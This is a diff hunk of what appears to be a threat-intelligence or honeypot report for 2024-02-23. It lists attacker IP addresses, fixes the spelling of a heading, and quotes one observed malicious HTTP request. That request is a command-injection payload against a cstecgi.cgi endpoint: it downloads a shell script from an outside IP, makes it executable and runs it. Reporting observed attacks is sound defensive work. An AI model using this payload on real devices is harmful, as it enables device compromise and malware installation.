@@ -6,7 +6,7 @@ Top 5 IPs for 2024-02-23 :
 112.6.41.110
 43.143.164.202
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 GET /cgi-bin/cstecgi.cgi?exportOvpn=&type=user&comand=;cd${IFS}/var/tmp;${IFS}wget${IFS}http://103.28.33.96/to.sh;${IFS}chmod${IFS}777${IFS}to.sh;${IFS}sh${IFS}to.sh;&filetype=gz
 User-Agent: KrebsOnSecurity
